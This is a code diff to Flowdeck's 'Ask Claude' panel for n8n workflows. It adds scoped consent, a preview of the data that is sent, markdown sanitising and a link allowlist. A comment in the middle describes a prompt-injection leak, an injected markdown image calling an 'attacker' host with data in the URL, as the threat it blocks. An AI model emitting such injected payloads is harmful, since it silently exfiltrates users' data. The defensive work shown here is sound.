@@ -6,9 +6,10 @@ import { div } from "gpui-kit";
 import { h_flex, v_flex, Textarea, TextView } from "gpui-base";
 import { shared, setShared } from "herdr";
 import { alpha, icon, button, chip, spinner, rise, mono, card, dot } from "./ui.js";
-import { buildContext, buildPrompt, SYSTEM_PROMPT, lastMentioned, mentionsInOrder } from "./model.js";
+import { buildContext, buildPrompt, SYSTEM_PROMPT, lastMentioned, mentionsInOrder, culpritIn, safeMarkdown, answerLinkAllowed } from "./model.js";
 import { MODELS, startAsk, readAsk, cancelAsk, cleanupAsk } from "./claude.js";
 import { graphView, GraphState } from "./graph.js";
+import { randomBytes } from "crypto";
 
 const CONSENT = "flowdeck.ask-consent";
 const MODEL = "flowdeck.ask-model";
@@ -57,9 +58,31 @@ export class AskSession {
     }
   }
 
+  // Consent is per instance and per kind of scope: saying yes for one workflow isn't saying yes to sending a summary
+  // of every workflow, or to another instance.
+  consented(view, scope = this.scope) {
+    const all = shared(CONSENT);
+    return Boolean(all && typeof all === "object" && all[view.profile?.id]?.[scope.kind === "all" ? "all" : "workflow"]);
+  }
+
+  consent(view) {
+    const all = shared(CONSENT);
+    const prev = all && typeof all === "object" ? all : {};
+    const pid = view.profile?.id;
+    setShared(CONSENT, { ...prev, [pid]: { ...(prev[pid] ?? {}), [this.scope.kind === "all" ? "all" : "workflow"]: true } });
+  }
+
+  // Exactly what would be sent for the current scope, for the preview.
+  contextFor(view, scope = this.scope) {
+    const m = view.derived();
+    const workflow = scope.kind !== "all" ? m.byId.get(scope.workflowId) : null;
+    const failure = scope.kind === "failure" ? m.groups.find((g) => g.latest && String(g.latest.id) === String(scope.runId)) ?? { latest: { id: scope.runId } } : null;
+    return buildContext({ scope: workflow ? "workflow" : "all", workflows: view.data.workflows, stats: m.stats, groups: m.groups, runs: view.data.runs, workflow, failure, instance: view.profile?.name });
+  }
+
   async ask(question, view, cx) {
     if (this.busy) return;
-    if (!shared(CONSENT)) { this.pending = question; cx.notify(); return; }
+    if (!this.consented(view)) { this.pending = question; this.preview = null; cx.notify(); return; }
     this.pending = null;
     const id = ++this.seq;
     const scope = { ...this.scope };
@@ -76,12 +99,9 @@ export class AskSession {
       return;
     }
     try {
-      const m = view.derived();
-      const workflow = scope.kind !== "all" ? m.byId.get(scope.workflowId) : null;
-      const failure = scope.kind === "failure" ? m.groups.find((g) => g.latest && String(g.latest.id) === String(scope.runId)) ?? { latest: { id: scope.runId } } : null;
-      const context = buildContext({ scope: workflow ? "workflow" : "all", workflows: view.data.workflows, stats: m.stats, groups: m.groups, runs: view.data.runs, workflow, failure, instance: view.profile?.name });
+      const context = this.contextFor(view, scope);
       a.chars = context.length;
-      const job = await startAsk({ prompt: buildPrompt(context, history, question), system: SYSTEM_PROMPT, model: this.model });
+      const job = await startAsk({ prompt: buildPrompt(context, history, question, randomBytes(6).toString("hex")), system: SYSTEM_PROMPT, model: this.model });
       a.job = job;
       this.job = job;
       a.floStep = 0;
@@ -143,14 +163,20 @@ function consentCard(view, c) {
   const what = s.kind === "all" ? "a summary of every workflow (names, node types, run counts and recent errors)" : `the "${s.label}" workflow: its nodes, their settings and its recent errors`;
   return card(c).id("consent").p(18).gap(12).border_color(alpha(c.brand, 0.5)).map(rise(true, 0))
     .child(h_flex().gap(10).items_center().child(icon("shield", 17, c.brand)).child(div().text_size(14).font_semibold().child("Before your first question")))
-    .child(div().text_size(12.8).text_color(c.foreground).child(`To answer, Flowdeck sends ${what} to Claude, through your own Claude Code sign-in.`))
+    .child(div().text_size(12.8).text_color(c.foreground).child(`To answer, Flowdeck sends ${what} from ${view.profile?.name ?? "this instance"} to Claude, through your own Claude Code sign-in. You'll be asked again for other instances, and before sending a summary of every workflow.`))
     .child(v_flex().gap(6)
       .child(h_flex().gap(8).items_start().child(icon("check", 13, c.ok)).child(div().text_size(12.3).text_color(c.muted).child("Never sent: credentials, pinned data, or the items your runs processed.")))
       .child(h_flex().gap(8).items_start().child(icon("check", 13, c.ok)).child(div().text_size(12.3).text_color(c.muted).child("Fields named like secrets, and values that look like keys or tokens, are masked first.")))
       .child(h_flex().gap(8).items_start().child(icon("check", 13, c.ok)).child(div().text_size(12.3).text_color(c.muted).child("Claude runs with every tool switched off: it can read what's sent and write an answer, nothing else."))))
     .child(h_flex().gap(10).pt(2)
-      .child(button(c, { id: "consent-yes", label: "Ask Claude", iconName: "spark", kind: "primary", onClick: (_e, cx) => { setShared(CONSENT, true); const q = view.asking.pending; view.asking.pending = null; if (q) view.ask(q, cx); } }))
-      .child(button(c, { id: "consent-no", label: "Not now", kind: "subtle", onClick: (_e, cx) => { view.asking.pending = null; cx.notify(); } })));
+      .child(button(c, { id: "consent-yes", label: "Ask Claude", iconName: "spark", kind: "primary", onClick: (_e, cx) => { view.asking.consent(view); const q = view.asking.pending; view.asking.pending = null; view.asking.preview = null; if (q) view.ask(q, cx); } }))
+      .child(button(c, { id: "consent-see", label: view.asking.preview ? "Hide what's sent" : "See exactly what's sent", iconName: "eye", kind: "ghost", onClick: (_e, cx) => {
+        view.asking.preview = view.asking.preview ? null : view.asking.contextFor(view);
+        cx.notify();
+      } }))
+      .child(button(c, { id: "consent-no", label: "Not now", kind: "subtle", onClick: (_e, cx) => { view.asking.pending = null; view.asking.preview = null; cx.notify(); } })))
+    .when(Boolean(view.asking.preview), (e) => e.child(div().id("consent-preview").max_h(260).overflow_y_scrollbar().p(10).rounded(8).bg(c.background).border(1).border_color(c.border)
+      .text_size(11).font_family(mono()).text_color(c.muted).child(String(view.asking.preview).slice(0, 20000))));
 }
 
 function answer(c, t, i) {
@@ -167,7 +193,7 @@ function answer(c, t, i) {
     .when(thinking, (e) => e.child(h_flex().gap(8).items_center().h(22)
       .child(div().text_size(12.5).text_color(c.muted).child("Reading your workflows"))
       .child(div().w(24).text_size(12.5).text_color(c.brand).frames(["·", "··", "···", " ··", "  ·", ""], 180).child(""))))
-    .when(Boolean(md), (e) => e.child(TextView.markdown(`md-${t.id}`, t.streaming ? `${md} ▍` : md).selectable(true).text_size(13).text_color(c.foreground)
+    .when(Boolean(md), (e) => e.child(TextView.markdown(`md-${t.id}`, safeMarkdown(t.streaming ? `${md} ▍` : md)).selectable(true).text_size(13).text_color(c.foreground)
       .on_link_click((url) => openSafe(url))))
     .when(Boolean(t.error), (e) => e.child(h_flex().gap(8).items_start().child(icon("alert", 13, c.err)).child(div().flex_1().text_size(12.5).text_color(c.err).child(t.error))))
     .when(Boolean(t.stopped), (e) => e.child(div().text_size(11.5).text_color(c.dim).child("Stopped.")));
@@ -176,16 +202,19 @@ function answer(c, t, i) {
 const question = (c, t) => h_flex().id(`turn-${t.id}`).justify_end().child(div().max_w("80%").px(14).py(9).rounded(14).bg(alpha(c.brand, 0.14)).border(1).border_color(alpha(c.brand, 0.3))
   .text_size(13).text_color(c.foreground).child(t.text));
 
-// An answer is written by a model that read untrusted workflow text, so its links only open when they point at the
-// person's own instance (through openLink's check) or n8n's documentation.
+// An answer is written by a model that read untrusted workflow text. Before it's drawn, images and raw HTML go: a
+// picture loads without a click, so an injected ![](https://attacker/?data=…) would be a silent leak. Code is left as
+// written. Links only open to the person's own workflow and execution pages, or n8n's docs: never a webhook or form
+// URL on their instance, which a click would run.
 let openSafe = () => {};
+const makeOpenSafe = (view) => (url) => {
+  const ok = answerLinkAllowed(url, view.profile?.base);
+  if (ok === "external") view.openExternal(String(url));
+  else if (ok === "instance") view.openLink(String(url));
+};
 
 export function askView(view, c) {
-  openSafe = (url) => {
-    const u = String(url);
-    if (/^https:\/\/(docs\.n8n\.io|community\.n8n\.io)(\/|$)/.test(u)) view.openExternal(u);
-    else view.openLink(u);
-  };
+  openSafe = makeOpenSafe(view);
   const s = view.asking, en = Boolean(view.entered.ask);
   const busy = s.busy;
   const sug = SUGGEST[s.scope.kind] ?? SUGGEST.all;
@@ -230,7 +259,7 @@ export function askView(view, c) {
 
 // What Claude is looking at, worked out from the answer as it streams: the workflow it last named (or the one asked
 // about), and the node of that workflow it last named. Flo stands there.
-export function claudeFocus(view) {
+export function claudeFocus(view, onlyWorkflow = null) {
   const s = view.asking, m = view.derived();
   const a = s.turns[0]?.a;
   const text = a?.text ?? "";
@@ -241,6 +270,7 @@ export function claudeFocus(view) {
     wf = view.data.workflows.find((w) => w.name === name) ?? null;
   }
   if (!wf || wf.partial || !(wf.nodes ?? []).length) return null;
+  if (onlyWorkflow && wf.id !== onlyWorkflow) return null;
   // Flo walks the nodes in the order Claude names them, one hop per tick of the session's walk timer, however fast
   // the text itself arrives.
   const tour = mentionsInOrder(text, wf.nodes.map((n) => n.name));
@@ -251,8 +281,17 @@ export function claudeFocus(view) {
   node = node ?? failing ?? (wf.nodes.find((n) => /trigger|webhook/i.test(n.type)) ?? wf.nodes[0]).name;
   const walking = Boolean(a) && (a.floStep ?? 0) < tour.length - 1;
   const busy = Boolean(a?.streaming) || walking;
-  const mood = busy ? "think" : a?.error ? "error" : !a && failing === node ? "error" : "look";
-  return { workflow: wf, node, mood, named, streaming: busy, step: tour.length ? Math.min(a?.floStep ?? 0, tour.length - 1) + 1 : 0, steps: tour.length, label: `Claude's focus: ${node}` };
+  // Once the answer is in and Flo has walked it, Flo goes to the node the answer blames (or, asked about a failure
+  // without blaming a node, the one that failed) and raises the alarm there.
+  const culprit = !busy && a && !a.error ? culpritIn(text, wf.nodes.map((n) => n.name)) ?? failing : null;
+  if (culprit) node = culprit;
+  const scanning = busy && named;
+  const mood = busy ? (named ? "scan" : "think") : culprit ? "error" : a?.error ? "error" : !a && failing === node ? "error" : "look";
+  return {
+    workflow: wf, node, mood, named, streaming: busy, scan: scanning, alert: culprit, culprit,
+    step: tour.length ? Math.min(a?.floStep ?? 0, tour.length - 1) + 1 : 0, steps: tour.length,
+    label: culprit ? `Likely cause: ${culprit}` : scanning ? `Scanning ${node}` : `Claude's focus: ${node}`,
+  };
 }
 
 function focusPanel(view, c, f, width) {
@@ -269,7 +308,55 @@ function focusPanel(view, c, f, width) {
       .child(div().relative().flex_1().min_h(0).child(graphView(c, { id: "focus-graph", graph, state: view.askGraph, run: null, replay: null, selected: f.named ? f.node : null, active: false, focus: f, follow: true,
         onSelect: (_n, cx) => cx.notify(), onChange: (cx) => cx.notify() }))))
     .child(h_flex().px(4).gap(8).items_center()
-      .child(div().text_size(12).text_color(c.muted).child(f.streaming ? (f.named ? "Looking at" : "Reading the workflow…") : f.named ? "Last talked about" : "Ready to look at"))
+      .child(div().text_size(12).text_color(f.culprit ? c.err : c.muted).child(f.culprit ? "Likely cause" : f.streaming ? (f.named ? "Scanning" : "Reading the workflow…") : f.named ? "Last talked about" : "Ready to look at"))
       .when(f.named || !f.streaming, (e) => e.child(div().flex_1().min_w(0).truncate().text_size(12).font_semibold().text_color(c.foreground).child(f.node)))
       .when(f.steps > 1, (e) => e.child(div().flex_none().text_size(11).font_family(mono()).text_color(c.dim).child(`${f.step}/${f.steps}`))));
+}
+
+// Ask Claude docked beside a workflow's graph: the same conversation as the Ask tab, narrower, so the answer and the
+// graph are on screen together. While Claude answers, Flo scans each node it names on the big graph; when it's done,
+// a strip here names the likely cause, and clicking it opens that node.
+export function askDock(view, c, w) {
+  openSafe = makeOpenSafe(view);
+  const s = view.asking, busy = s.busy;
+  const f = claudeFocus(view, w.id);
+  const mine = s.scope.kind !== "all" && s.scope.workflowId === w.id;
+  const turns = mine ? s.turns : [];
+  const sug = (SUGGEST[s.scope.kind] ?? SUGGEST.workflow).slice(0, 3);
+  const status = f && (f.streaming || f.culprit)
+    ? h_flex().id("dock-status").mx(12).px(11).py(8).gap(9).items_center().rounded(9)
+      .bg(alpha(f.culprit ? c.err : c.run, 0.1)).border(1).border_color(alpha(f.culprit ? c.err : c.run, 0.4))
+      .when(Boolean(f.culprit), (e) => e.cursor_pointer().hover((st) => st.bg(alpha(c.err, 0.16))).tooltip("Open this node")
+        .on_click((_e, cx) => { view.sel.node = f.culprit; view.inspectFromDock = true; cx.notify(); }))
+      .child(f.culprit ? icon("alert", 14, c.err) : spinner(13, c.run))
+      .child(div().flex_none().text_size(12).text_color(c.muted).child(f.culprit ? "Likely cause" : f.named ? "Flo is scanning" : "Claude is reading"))
+      .child(div().flex_1().min_w(0).truncate().text_size(12).font_semibold().text_color(f.culprit ? c.err : c.foreground).child(f.named || f.culprit ? f.node : "the workflow…"))
+      .when(f.steps > 1 && !f.culprit, (e) => e.child(div().flex_none().text_size(11).font_family(mono()).text_color(c.dim).child(`${f.step}/${f.steps}`)))
+      .when(Boolean(f.culprit), (e) => e.child(icon("chevron", 12, c.err)))
+    : null;
+  return v_flex().id("dock").w(400).flex_none().h_full().border_l(1).border_color(c.border).bg(c.surface)
+    .child(h_flex().px(14).py(10).gap(9).items_center().border_b(1).border_color(c.border)
+      .child(h_flex().size(26).rounded(7).items_center().justify_center().bg(alpha(c.brand, 0.16)).child(busy ? spinner(13, c.brand) : icon("spark", 13, c.brand)))
+      .child(v_flex().flex_1().min_w(0)
+        .child(div().text_size(13).font_semibold().child("Ask Claude"))
+        .child(div().truncate().text_size(11).text_color(c.dim).child(mine ? s.scope.label : w.name)))
+      .child(modelPicker(view, c))
+      .child(button(c, { id: "dock-close", iconName: "close", kind: "subtle", size: "sm", tooltip: "Close", onClick: (_e, cx) => { view.dockOpen = false; cx.notify(); } })))
+    .child(v_flex().p(12).gap(8)
+      .child(h_flex().gap(8).items_end().p(10).rounded(11).bg(c.background).border(1).border_color(busy ? alpha(c.brand, 0.5) : c.border)
+        .child(div().id("dock-input").flex_1().min_w(0).py(2).cursor_text().on_mouse_down("left", (_e, cx) => cx.stop_propagation())
+          .child(Textarea.new(view.inputs.ask).w_full().text_size(13).text_color(c.foreground)))
+        .child(busy
+          ? button(c, { id: "dock-stop", iconName: "stop", kind: "solid", size: "sm", tooltip: "Stop", onClick: (_e, cx) => cx.spawn(async (cx) => { await s.cancel(); cx.notify(); }) })
+          : button(c, { id: "dock-send", iconName: "send", kind: "primary", size: "sm", tooltip: "Ask (Enter)", onClick: (_e, cx) => view.askCurrent(cx) })))
+      .child(h_flex().gap(6).items_center().child(icon("lock", 10, c.dim))
+        .child(div().truncate().text_size(10.5).text_color(c.dim).child("Structure and errors only. Never credentials or run data."))))
+    .when(Boolean(status), (e) => e.child(status))
+    .when(Boolean(s.pending), (e) => e.child(div().px(12).pt(8).child(consentCard(view, c))))
+    .child(v_flex().id("dock-scroll").flex_1().min_h(0).overflow_y_scrollbar().p(12).gap(10)
+      .when(!turns.length && !s.pending, (e) => e.children(sug.map((q, i) => h_flex().id(`dsug-${i}`).px(12).py(9).gap(9).items_center().rounded(10)
+        .border(1).border_color(c.border).cursor_pointer().hover((st) => st.border_color(alpha(c.brand, 0.6)).bg(c.hover))
+        .on_click((_e, cx) => view.ask(q, cx))
+        .child(icon("spark", 12, c.brand)).child(div().flex_1().min_w(0).text_size(12.3).child(q)))))
+      .children(turns.map((p, i) => v_flex().id(`dpair-${p.q.id}`).gap(8).child(question(c, p.q)).child(answer(c, p.a, i)))));
 }
